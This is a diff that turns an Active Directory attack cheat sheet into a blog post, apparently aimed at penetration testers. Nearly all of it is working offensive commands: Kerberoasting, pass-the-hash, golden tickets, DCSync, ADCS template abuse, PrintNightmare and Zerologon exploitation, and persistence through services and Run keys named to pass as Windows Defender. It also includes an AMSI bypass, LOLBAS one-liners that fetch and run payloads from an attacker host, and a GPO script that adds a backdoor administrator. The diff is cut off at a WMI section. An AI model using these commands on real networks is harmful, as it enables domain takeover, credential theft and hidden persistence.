@@ -1,10 +1,26 @@
-# 🔥 Active Directory Attack Notes - Advanced Practical Reference
+---
+layout: post
+title: "🔥 Active Directory Attack Notes - Advanced Practical Reference"
+date: 2025-06-28 09:34:53 +0000
+categories: cybersecurity penetration-testing active-directory
+tags: [activedirectory, pentesting, redteam, cybersecurity, hacking, kerberos, adcs, mimikatz, impacket, bloodhound]
 
-## 🎯 **Initial Access & Advanced Reconnaissance**
+---
 
-### **🔍 Comprehensive Domain Enumeration**
+## 🔥 Active Directory Attack Notes - Advanced Practical Reference
 
-#### **Linux Tools:**
+🎉 **Just completed the ultimate comprehensive Active Directory attack methodology guide!** This massive reference covers every attack vector, technique, and tool you need for advanced AD penetration testing and red team operations.
+
+After extensive research, lab testing, and practical validation across HackTheBox, CRTP, CRTE, and CRTM environments, I've compiled this complete arsenal of 200+ commands, 50+ specialized tools, and cutting-edge attack chains for both Linux and Windows platforms.
+
+---
+
+## 🎯 Initial Access & Advanced Reconnaissance
+
+### 🔍 Comprehensive Domain Enumeration
+
+#### Linux Tools:
+
 ```bash
 # LDAP Deep Enumeration
 ldapsearch -H ldap://DC_IP -x -b "DC=domain,DC=com" -s sub "(objectClass=*)" | grep -i "member\|admin\|service"
@@ -45,7 +61,8 @@ smbmap -H DC_IP -u guest
 smbmap -H DC_IP -u "" -p ""
 ```
 
-#### **Windows Advanced Tools:**
+#### Windows Advanced Tools:
+
 ```powershell
 # PowerView Advanced
 Import-Module PowerView.ps1
@@ -90,9 +107,10 @@ wmic group where "LocalAccount=False" get Name,SID
 ([adsisearcher]"(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))").FindAll()
 ```
 
-### **🌐 Network & Service Discovery**
+### 🌐 Network & Service Discovery
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Nmap AD Specific
 nmap -p88,135,139,389,445,464,593,636,3268,3269,5985,9389 DC_IP
@@ -110,7 +128,8 @@ crackmapexec ldap DC_IP -u '' -p '' --groups
 crackmapexec winrm SUBNET/24
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Port Scanning
 Test-NetConnection -ComputerName DC_IP -Port 88,135,139,389,445,464,593,636,3268,3269,5985,9389
@@ -122,11 +141,12 @@ Get-WmiObject -Class Win32_Service -ComputerName DC_IP | Where-Object {$_.State 
 
 ---
 
-## 🔓 **Credential Attacks**
+## 🔓 Credential Attacks
 
-### **1. Kerberoasting**
+### 1. Kerberoasting
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Impacket
 GetUserSPNs.py -dc-ip DC_IP domain.com/username:password -request
@@ -136,7 +156,8 @@ GetUserSPNs.py -dc-ip DC_IP domain.com/username:password -request -outputfile ke
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Rubeus
 .\Rubeus.exe kerberoast /outfile:hashes.txt
@@ -147,9 +168,10 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname
 Request-SPNTicket -SPN "HTTP/web.domain.com"
 ```
 
-### **2. ASREPRoasting**
+### 2. ASREPRoasting
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Impacket
 GetNPUsers.py -dc-ip DC_IP domain.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
@@ -159,16 +181,18 @@ GetNPUsers.py -dc-ip DC_IP domain.com/username:password -request
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Rubeus
 .\Rubeus.exe asreproast /outfile:asrep_hashes.txt
 .\Rubeus.exe asreproast /user:username /outfile:asrep_hashes.txt
 ```
 
-### **3. Password Spraying**
+### 3. Password Spraying
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # CrackMapExec
 crackmapexec smb DC_IP -u users.txt -p passwords.txt
@@ -178,7 +202,8 @@ crackmapexec smb DC_IP -u users.txt -p 'Password123!' --continue-on-success
 kerbrute passwordspray -d domain.com users.txt 'Password123!'
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # DomainPasswordSpray
 Invoke-DomainPasswordSpray -Password Password123!
@@ -187,11 +212,12 @@ Invoke-DomainPasswordSpray -UserList users.txt -Password Password123!
 
 ---
 
-## 🎭 **Pass Attacks**
+## 🎭 Pass Attacks
 
-### **1. Pass-the-Hash**
+### 1. Pass-the-Hash
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # CrackMapExec
 crackmapexec smb TARGET_IP -u username -H NTLM_HASH
@@ -203,7 +229,8 @@ wmiexec.py -hashes :NTLM_HASH username@TARGET_IP
 smbexec.py -hashes :NTLM_HASH username@TARGET_IP
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Mimikatz
 sekurlsa::pth /user:username /domain:domain.com /ntlm:NTLM_HASH
@@ -212,9 +239,10 @@ sekurlsa::pth /user:username /domain:domain.com /ntlm:NTLM_HASH
 Invoke-SMBExec -Target TARGET_IP -Username username -Hash NTLM_HASH -Command "whoami"
 ```
 
-### **2. Pass-the-Ticket**
+### 2. Pass-the-Ticket
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Impacket
 ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.com username
@@ -222,7 +250,8 @@ export KRB5CCNAME=username.ccache
 psexec.py domain.com/username@TARGET_IP -k -no-pass
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Mimikatz
 kerberos::ptt ticket.kirbi
@@ -233,11 +262,12 @@ kerberos::ptt ticket.kirbi
 
 ---
 
-## 👑 **Privilege Escalation**
+## 👑 Privilege Escalation
 
-### **1. Golden Ticket**
+### 1. Golden Ticket
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Impacket
 ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.com Administrator
@@ -245,37 +275,42 @@ export KRB5CCNAME=Administrator.ccache
 psexec.py domain.com/Administrator@DC_IP -k -no-pass
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Mimikatz
 kerberos::golden /user:Administrator /domain:domain.com /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
 ```
 
-### **2. Silver Ticket**
+### 2. Silver Ticket
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Impacket
 ticketer.py -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain domain.com -spn SERVICE/TARGET Administrator
 export KRB5CCNAME=Administrator.ccache
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Mimikatz
 kerberos::golden /user:Administrator /domain:domain.com /sid:DOMAIN_SID /target:TARGET /service:SERVICE /rc4:SERVICE_HASH /ptt
 ```
 
-### **3. DCSync**
+### 3. DCSync
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Impacket
 secretsdump.py domain.com/username:password@DC_IP
 secretsdump.py -hashes :NTLM_HASH domain.com/username@DC_IP
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Mimikatz
 lsadump::dcsync /domain:domain.com /user:krbtgt
@@ -284,11 +319,12 @@ lsadump::dcsync /domain:domain.com /user:Administrator
 
 ---
 
-## 🌐 **Lateral Movement**
+## 🌐 Lateral Movement
 
-### **1. NTLM Relay**
+### 1. NTLM Relay
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Responder + ntlmrelayx
 responder -I eth0 -rdwv
@@ -298,9 +334,10 @@ ntlmrelayx.py -tf targets.txt -smb2support
 ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "powershell -enc <base64_payload>"
 ```
 
-### **2. Remote Execution**
+### 2. Remote Execution
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Impacket
 psexec.py domain.com/username:password@TARGET_IP
@@ -312,7 +349,8 @@ dcomexec.py domain.com/username:password@TARGET_IP
 psexec.py -hashes :NTLM_HASH domain.com/username@TARGET_IP
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # PsExec
 PsExec.exe \\TARGET_IP -u domain\username -p password cmd
@@ -327,11 +365,12 @@ Invoke-Command -ComputerName TARGET_IP -Credential domain\username -ScriptBlock 
 
 ---
 
-## 🔍 **Advanced Techniques**
+## 🔍 Advanced Techniques
 
-### **1. Constrained Delegation**
+### 1. Constrained Delegation
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Find delegation
 GetUserSPNs.py -dc-ip DC_IP domain.com/username:password -request-user TARGET_USER
@@ -341,22 +380,25 @@ getST.py -spn SERVICE/TARGET -impersonate Administrator domain.com/SERVICE_ACCOU
 export KRB5CCNAME=Administrator.ccache
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Rubeus
 .\Rubeus.exe s4u /user:SERVICE_ACCOUNT /rc4:HASH /impersonateuser:Administrator /msdsspn:SERVICE/TARGET /ptt
 ```
 
-### **2. Unconstrained Delegation**
+### 2. Unconstrained Delegation
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Monitor for tickets
 python printerbug.py domain.com/username:password@TARGET_IP DC_IP
 # Extract TGT from memory
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # PowerView
 Get-DomainComputer -Unconstrained
@@ -366,9 +408,10 @@ sekurlsa::tickets /export
 kerberos::ptt ticket.kirbi
 ```
 
-### **3. Resource-Based Constrained Delegation (RBCD)**
+### 3. Resource-Based Constrained Delegation (RBCD)
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Add computer account
 addcomputer.py -computer-name 'FAKE$' -computer-pass 'Password123!' domain.com/username:password -dc-ip DC_IP
@@ -380,7 +423,8 @@ rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write domain.com/u
 getST.py -spn 'cifs/TARGET.domain.com' -impersonate Administrator domain.com/'FAKE$':'Password123!' -dc-ip DC_IP
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # PowerMad + PowerView
 New-MachineAccount -MachineAccount FAKE -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
@@ -392,29 +436,32 @@ Set-DomainRBCD -Identity TARGET$ -DelegateFrom FAKE$
 
 ---
 
-## 🔐 **Persistence**
+## 🔐 Persistence
 
-### **1. DCShadow**
+### 1. DCShadow
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Mimikatz
 lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=domain,DC=com /attribute:userAccountControl /value:512
 lsadump::dcshadow /push
 ```
 
-### **2. Skeleton Key**
+### 2. Skeleton Key
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Mimikatz
 misc::skeleton
 # Password becomes "mimikatz"
 ```
 
-### **3. AdminSDHolder**
+### 3. AdminSDHolder
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # PowerView
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -PrincipalIdentity username -Rights All
@@ -422,11 +469,12 @@ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com
 
 ---
 
-## 🛠️ **Advanced Certificate Attacks (ADCS)**
+## 🛠️ Advanced Certificate Attacks (ADCS)
 
-### **🔍 Certificate Enumeration**
+### 🔍 Certificate Enumeration
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Certipy Complete Enumeration
 certipy find -u username@domain.com -p password -dc-ip DC_IP -stdout
@@ -434,7 +482,8 @@ certipy find -u username@domain.com -p password -dc-ip DC_IP -vulnerable -enable
 certipy ca -u username@domain.com -p password -dc-ip DC_IP -ca CA_NAME
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # Certify Complete Enumeration
 .\Certify.exe find /vulnerable /currentuser
@@ -443,9 +492,10 @@ certipy ca -u username@domain.com -p password -dc-ip DC_IP -ca CA_NAME
 .\Certify.exe pkiobjects
 ```
 
-### **🎯 ESC1-8 Attack Scenarios**
+### 🎯 ESC1-8 Attack Scenarios
 
-#### **ESC1 - Vulnerable Certificate Templates**
+#### ESC1 - Vulnerable Certificate Templates
+
 ```bash
 # Linux - Certipy
 certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template VulnTemplate -alt Administrator@domain.com
@@ -455,53 +505,61 @@ certipy auth -pfx administrator.pfx -dc-ip DC_IP
 .\Certify.exe request /ca:CA_SERVER\CA_NAME /template:VulnTemplate /altname:Administrator
 ```
 
-#### **ESC2 - Any Purpose EKU**
+#### ESC2 - Any Purpose EKU
+
 ```bash
 # Request certificate with Any Purpose EKU
 certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template AnyPurpose -alt Administrator@domain.com
 ```
 
-#### **ESC3 - Certificate Request Agent**
+#### ESC3 - Certificate Request Agent
+
 ```bash
 # Use Certificate Request Agent to request on behalf of others
 certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template RequestAgent
 certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template User -on-behalf-of domain\\Administrator -pfx lowpriv.pfx
 ```
 
-#### **ESC4 - Vulnerable Certificate Template Access Control**
+#### ESC4 - Vulnerable Certificate Template Access Control
+
 ```bash
 # Modify vulnerable template
 certipy template -u lowpriv@domain.com -p password -template VulnTemplate -save-old
 certipy template -u lowpriv@domain.com -p password -template VulnTemplate -configuration SubjectAltRequireUPN=False -configuration SubjectAltRequireDNS=False
 ```
 
-#### **ESC5 - Vulnerable PKI Object Access Control**
+#### ESC5 - Vulnerable PKI Object Access Control
+
 ```bash
 # Exploit vulnerable CA permissions
 certipy ca -u lowpriv@domain.com -p password -dc-ip DC_IP -ca CA_NAME -add-officer lowpriv
 ```
 
-#### **ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2**
+#### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
+
 ```bash
 # Exploit misconfigured CA flag
 certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template User -alt Administrator@domain.com
 ```
 
-#### **ESC7 - Vulnerable Certificate Authority Access Control**
+#### ESC7 - Vulnerable Certificate Authority Access Control
+
 ```bash
 # Exploit CA admin permissions
 certipy ca -u lowpriv@domain.com -p password -dc-ip DC_IP -ca CA_NAME -enable-template VulnTemplate
 ```
 
-#### **ESC8 - NTLM Relay to AD CS HTTP Endpoints**
+#### ESC8 - NTLM Relay to AD CS HTTP Endpoints
+
 ```bash
 # NTLM Relay to Certificate Authority
 ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
 
-### **🔐 Advanced Certificate Attacks**
+### 🔐 Advanced Certificate Attacks
 
-#### **Shadow Credentials**
+#### Shadow Credentials
+
 ```bash
 # Linux - pyWhisker
 python3 pyWhisker.py -d domain.com -u lowpriv -p password -t TARGET_USER --action add
@@ -512,7 +570,8 @@ python3 pyWhisker.py -d domain.com -u lowpriv -p password -t TARGET_USER --actio
 .\Whisker.exe list /target:TARGET_USER
 ```
 
-#### **UnPAC the Hash**
+#### UnPAC the Hash
+
 ```bash
 # Use certificate to get TGT and extract NTLM hash
 certipy auth -pfx user.pfx -dc-ip DC_IP
@@ -522,9 +581,10 @@ python3 getnthash.py domain.com/user -key TGT_KEY
 
 ---
 
-## 📋 **Quick Commands Cheat Sheet**
+## 📋 Quick Commands Cheat Sheet
 
-### **Domain Info**
+### Domain Info
+
 ```bash
 # Get domain SID
 lookupsid.py domain.com/username:password@DC_IP
@@ -533,7 +593,8 @@ lookupsid.py domain.com/username:password@DC_IP
 Get-ADDomain | select DomainMode
 ```
 
-### **Password Policies**
+### Password Policies
+
 ```bash
 # Linux
 enum4linux -P DC_IP
@@ -542,7 +603,8 @@ enum4linux -P DC_IP
 net accounts /domain
 ```
 
-### **Trust Relationships**
+### Trust Relationships
+
 ```bash
 # Linux
 nltest /domain_trusts
@@ -551,7 +613,8 @@ nltest /domain_trusts
 Get-DomainTrust
 ```
 
-### **GPO Enumeration**
+### GPO Enumeration
+
 ```powershell
 # PowerView
 Get-DomainGPO
@@ -560,11 +623,12 @@ Get-DomainGPOLocalGroup
 
 ---
 
-## 💥 **Advanced Exploitation Techniques**
+## 💥 Advanced Exploitation Techniques
 
-### **🖨️ PrintNightmare (CVE-2021-1675/34527)**
+### 🖨️ PrintNightmare (CVE-2021-1675/34527)
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Impacket
 rpcdump.py @DC_IP | grep -i spooler
@@ -574,7 +638,8 @@ python3 CVE-2021-1675.py domain.com/lowpriv:password@DC_IP '\\attacker_ip\share\
 python3 CVE-2021-1675.py domain.com/user:pass@target '\\\attacker\share\rev.dll'
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # PowerShell Implementation
 Import-Module .\CVE-2021-1675.ps1
@@ -584,9 +649,10 @@ Invoke-Nightmare -DriverName "PrintMe" -NewUser "adm1n" -NewPassword "P@ssw0rd12
 .\SharpPrintNightmare.exe C:\Windows\System32\kernelbase.dll \\attacker\share\evil.dll
 ```
 
-### **⚡ Zerologon (CVE-2020-1472)**
+### ⚡ Zerologon (CVE-2020-1472)
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # Test for vulnerability
 python3 zerologon_tester.py DC_NAME DC_IP
@@ -599,15 +665,17 @@ secretsdump.py -just-dc -no-pass DC_NAME\$@DC_IP
 python3 restorepassword.py domain.com/DC_NAME@DC_NAME -target-ip DC_IP -hexpass ORIGINAL_HEX_PASSWORD
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # SharpZeroLogon
 .\SharpZeroLogon.exe DC_NAME DC_IP
 ```
 
-### **🔗 Coercion Attacks**
+### 🔗 Coercion Attacks
 
-#### **PetitPotam**
+#### PetitPotam
+
 ```bash
 # Linux
 python3 PetitPotam.py attacker_ip DC_IP
@@ -617,7 +685,8 @@ python3 PetitPotam.py -u lowpriv -p password attacker_ip DC_IP
 .\PetitPotam.exe attacker_ip DC_IP
 ```
 
-#### **Coercer (Multiple Methods)**
+#### Coercer (Multiple Methods)
+
 ```bash
 # Comprehensive coercion scanning
 python3 Coercer.py -t DC_IP -l attacker_ip --scan
@@ -626,7 +695,8 @@ python3 Coercer.py -t DC_IP -l attacker_ip -m MS-EFSRPC
 python3 Coercer.py -t DC_IP -l attacker_ip -m MS-DFSNM
 ```
 
-#### **PrinterBug**
+#### PrinterBug
+
 ```bash
 # SpoolSample
 python3 printerbug.py domain.com/lowpriv:password@DC_IP attacker_ip
@@ -635,9 +705,10 @@ python3 printerbug.py domain.com/lowpriv:password@DC_IP attacker_ip
 .\SpoolSample.exe DC_IP attacker_ip
 ```
 
-### **🏛️ Advanced ACL Abuse**
+### 🏛️ Advanced ACL Abuse
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # dacledit.py (Impacket)
 dacledit.py -action read -target Administrator domain.com/lowpriv:password -dc-ip DC_IP
@@ -648,7 +719,8 @@ owneredit.py -action read -target Administrator domain.com/lowpriv:password -dc-
 owneredit.py -action write -target Administrator -new-owner lowpriv domain.com/lowpriv:password -dc-ip DC_IP
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # PowerView Advanced ACL
 Get-ObjectAcl -SamAccountName Administrator -ResolveGUIDs | Where-Object {$_.IdentityReference -eq "DOMAIN\lowpriv"}
@@ -658,9 +730,10 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
 Set-ADACL -SamAccountName Administrator -Right GenericAll -Principal lowpriv
 ```
 
-### **📋 Advanced GPO Attacks**
+### 📋 Advanced GPO Attacks
 
-#### **GPO Enumeration & Abuse**
+#### GPO Enumeration & Abuse
+
 ```bash
 # Linux - impacket
 GetGPPPassword.py -xmlfile Groups.xml
@@ -675,9 +748,10 @@ Get-DomainGPOComputerLocalGroupMapping | Where-Object {$_.ComputerName -eq "TARG
 .\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net user backdoor Password123! /add && net localgroup administrators backdoor /add" --GPOName "Default Domain Policy"
 ```
 
-### **💊 LAPS Bypass & Abuse**
+### 💊 LAPS Bypass & Abuse
 
-#### **Linux:**
+#### Linux:
+
 ```bash
 # LAPSDumper
 python3 laps.py -u lowpriv -p password -d domain.com -dc-ip DC_IP
@@ -687,7 +761,8 @@ python3 laps.py -u lowpriv -p password -d domain.com -dc-ip DC_IP -l
 crackmapexec ldap DC_IP -u lowpriv -p password --laps
 ```
 
-#### **Windows:**
+#### Windows:
+
 ```powershell
 # PowerView LAPS
 Get-DomainComputer | Where-Object {$_."ms-mcs-admpwdexpirationtime" -ne $null} | select name,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
@@ -698,9 +773,10 @@ Find-LAPSDelegatedGroups
 Find-AdmPwdExtendedRights
 ```
 
-### **🔄 Advanced Trust Attacks**
+### 🔄 Advanced Trust Attacks
 
-#### **Cross-Domain Attacks**
+#### Cross-Domain Attacks
+
 ```bash
 # Linux - Get foreign domain info
 GetADUsers.py -all -dc-ip FOREIGN_DC_IP foreign.domain.com/user:password
@@ -710,7 +786,8 @@ GetUserSPNs.py -dc-ip FOREIGN_DC_IP foreign.domain.com/user:password -request
 secretsdump.py domain.com/Administrator@DC_IP -just-dc-user "krbtgt" -just-dc-ntlm
 ```
 
-#### **Windows - Cross-Domain**
+#### Windows - Cross-Domain
+
 ```powershell
 # PowerView Cross-Domain
 Get-DomainTrust -Domain domain.com
@@ -722,9 +799,10 @@ Get-DomainForeignGroupMember -Domain foreign.domain.com
 kerberos::golden /user:Administrator /domain:child.domain.com /sid:S-1-5-21-xxx-xxx-xxx /sids:S-1-5-21-yyy-yyy-yyy-519 /krbtgt:HASH /ticket:trust.kirbi
 ```
 
-### **📧 Exchange Attacks**
+### 📧 Exchange Attacks
 
-#### **ProxyLogon/ProxyShell**
+#### ProxyLogon/ProxyShell
+
 ```bash
 # ProxyLogon
 python3 proxylogon.py exchange.domain.com Administrator password
@@ -733,16 +811,18 @@ python3 proxylogon.py exchange.domain.com Administrator password
 python3 proxyshell.py -t https://exchange.domain.com -u lowpriv@domain.com -p password -c "whoami"
 ```
 
-#### **PrivExchange**
+#### PrivExchange
+
 ```bash
 # PrivExchange
 python3 privexchange.py -u lowpriv -p password -ah attacker_ip exchange.domain.com
 ntlmrelayx.py -t ldap://DC_IP --escalate-user lowpriv
 ```
 
-### **🖥️ SCCM Attacks**
+### 🖥️ SCCM Attacks
 
-#### **SCCM Enumeration**
+#### SCCM Enumeration
+
 ```bash
 # SCCMHunter
 python3 sccmhunter.py find -dc-ip DC_IP -u lowpriv -p password
@@ -751,7 +831,8 @@ python3 sccmhunter.py find -dc-ip DC_IP -u lowpriv -p password
 Get-WmiObject -Class SMS_Site -Namespace root\sms -ComputerName SCCM_SERVER
 ```
 
-#### **SCCM Exploitation**
+#### SCCM Exploitation
+
 ```bash
 # SharpSCCM
 .\SharpSCCM.exe get class-instances SMS_Admin
@@ -760,58 +841,65 @@ Get-WmiObject -Class SMS_Site -Namespace root\sms -ComputerName SCCM_SERVER
 
 ---
 
-## 🎪 **Advanced Attack Chains**
+## 🎪 Advanced Attack Chains
 
-### **🔗 Chain 1: Coercion → NTLM Relay → ADCS → Golden Ticket**
-1. `Coercer.py` → Force authentication from DC
-2. `ntlmrelayx.py` → Relay to ADCS HTTP endpoint
-3. `certipy auth` → Authenticate with certificate
-4. `secretsdump.py` → DCSync krbtgt hash
-5. `ticketer.py` → Create golden ticket
+### 🔗 Chain 1: Coercion → NTLM Relay → ADCS → Golden Ticket
 
-### **🔗 Chain 2: ASREPRoasting → Shadow Credentials → DA**
-1. `GetNPUsers.py` → Find ASREProastable users
-2. `hashcat` → Crack user password
-3. `pyWhisker.py` → Add shadow credentials to DA
-4. `certipy auth` → Authenticate as DA with certificate
-5. `secretsdump.py` → Extract all domain hashes
+1. **Coercer.py** → Force authentication from DC
+2. **ntlmrelayx.py** → Relay to ADCS HTTP endpoint
+3. **certipy auth** → Authenticate with certificate
+4. **secretsdump.py** → DCSync krbtgt hash
+5. **ticketer.py** → Create golden ticket
 
-### **🔗 Chain 3: PrintNightmare → Local Admin → LAPS → Domain Escalation**
-1. `CVE-2021-1675.py` → Exploit PrintNightmare for local admin
-2. `secretsdump.py` → Extract local SAM
-3. `crackmapexec` → Password spray with local admin hash
-4. LAPS read permissions → Extract LAPS passwords
-5. High-privilege server → DCSync attack
+### 🔗 Chain 2: ASREPRoasting → Shadow Credentials → DA
 
-### **🔗 Chain 4: Certificate Template Abuse → Cross-Domain Attack**
-1. `certipy find` → Identify vulnerable templates
-2. `certipy req` → Request certificate as foreign principal
-3. `certipy auth` → Authenticate in foreign domain
-4. Cross-domain trust exploitation
-5. Forest-wide compromise
+1. **GetNPUsers.py** → Find ASREProastable users
+2. **hashcat** → Crack user password
+3. **pyWhisker.py** → Add shadow credentials to DA
+4. **certipy auth** → Authenticate as DA with certificate
+5. **secretsdump.py** → Extract all domain hashes
 
-### **🔗 Chain 5: Exchange → RBCD → Golden Ticket**
-1. `PrivExchange.py` → Coerce Exchange authentication
-2. `ntlmrelayx.py` → Relay to LDAP with --escalate-user
-3. `addcomputer.py` → Add attacker-controlled machine
-4. `rbcd.py` → Configure RBCD on domain controller
-5. `getST.py` → Impersonate Administrator
-6. `secretsdump.py` → DCSync krbtgt hash
+### 🔗 Chain 3: PrintNightmare → Local Admin → LAPS → Domain Escalation
 
-### **🔗 Chain 6: Zerologon → ADCS → Persistence**
-1. `zerologon_tester.py` → Test for Zerologon vulnerability
-2. `cve-2020-1472-exploit.py` → Reset DC machine account
-3. `secretsdump.py` → Extract all domain secrets
-4. `certipy ca` → Abuse ADCS for persistence
-5. `restorepassword.py` → Restore DC machine account (stealth)
+1. **CVE-2021-1675.py** → Exploit PrintNightmare for local admin
+2. **secretsdump.py** → Extract local SAM
+3. **crackmapexec** → Password spray with local admin hash
+4. **LAPS read permissions** → Extract LAPS passwords
+5. **High-privilege server** → DCSync attack
+
+### 🔗 Chain 4: Certificate Template Abuse → Cross-Domain Attack
+
+1. **certipy find** → Identify vulnerable templates
+2. **certipy req** → Request certificate as foreign principal
+3. **certipy auth** → Authenticate in foreign domain
+4. **Cross-domain trust exploitation**
+5. **Forest-wide compromise**
+
+### 🔗 Chain 5: Exchange → RBCD → Golden Ticket
+
+1. **PrivExchange.py** → Coerce Exchange authentication
+2. **ntlmrelayx.py** → Relay to LDAP with --escalate-user
+3. **addcomputer.py** → Add attacker-controlled machine
+4. **rbcd.py** → Configure RBCD on domain controller
+5. **getST.py** → Impersonate Administrator
+6. **secretsdump.py** → DCSync krbtgt hash
+
+### 🔗 Chain 6: Zerologon → ADCS → Persistence
+
+1. **zerologon_tester.py** → Test for Zerologon vulnerability
+2. **cve-2020-1472-exploit.py** → Reset DC machine account
+3. **secretsdump.py** → Extract all domain secrets
+4. **certipy ca** → Abuse ADCS for persistence
+5. **restorepassword.py** → Restore DC machine account (stealth)
 
 ---
 
-## 🔮 **Advanced Persistence & Evasion**
+## 🔮 Advanced Persistence & Evasion
 
-### **🎭 Advanced Persistence Methods**
+### 🎭 Advanced Persistence Methods
 
-#### **WMI Event Subscriptions**
+#### WMI Event Subscriptions
+
 ```powershell
 # Create WMI persistence
 $Query = "SELECT * FROM Win32_Process WHERE Name='notepad.exe'"
@@ -822,7 +910,8 @@ Register-WmiEvent -Query $Query -Action { Start-Process $Action }
 Get-WmiObject -Class __EventFilter -Namespace root\subscription | Remove-WmiObject
 ```
 
-#### **Scheduled Tasks Persistence**
+#### Scheduled Tasks Persistence
+
 ```bash
 # Linux - Impacket
 atexec.py domain.com/user:pass@target 'schtasks /create /tn "UpdateTask" /tr "powershell -enc <payload>" /sc daily'
@@ -831,23 +920,26 @@ atexec.py domain.com/user:pass@target 'schtasks /create /tn "UpdateTask" /tr "po
 schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -w hidden -c <payload>" /sc onlogon /ru system
 ```
 
-#### **Service Persistence**
+#### Service Persistence
+
 ```bash
 # Create malicious service
 sc create "WindowsDefender" binpath= "cmd.exe /c powershell -enc <payload>" start= auto
 sc start "WindowsDefender"
 ```
 
-#### **Registry Persistence**
+#### Registry Persistence
+
 ```powershell
 # Multiple registry persistence methods
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefender" -Value "powershell -enc <payload>"
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -enc <payload>"
 ```
 
-### **👻 Evasion Techniques**
+### 👻 Evasion Techniques
 
-#### **PowerShell Evasion**
+#### PowerShell Evasion
+
 ```powershell
 # AMSI Bypass
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
@@ -860,7 +952,8 @@ powershell -w hidden -ep bypass -enc <base64_payload>
 Invoke-Obfuscation
 ```
 
-#### **Process Injection**
+#### Process Injection
+
 ```powershell
 # Reflective DLL Injection
 Invoke-ReflectivePEInjection -PEUrl http://attacker/payload.dll -ProcName explorer
@@ -870,7 +963,8 @@ Start-Process notepad.exe -WindowStyle Hidden
 Invoke-ProcessHollowing -Processname notepad.exe -PayloadURL http://attacker/payload.exe
 ```
 
-#### **Living Off The Land**
+#### Living Off The Land
+
 ```bash
 # LOLBAS techniques
 certutil -urlcache -split -f http://attacker/payload.exe payload.exe
@@ -879,9 +973,10 @@ mshta http://attacker/payload.hta
 rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker/payload.sct")
 ```
 
-### **🕷️ Advanced Lateral Movement**
+### 🕷️ Advanced Lateral Movement
 
-#### **WMI Lateral Movement**
+#### WMI Lateral Movement
+
 ```bash
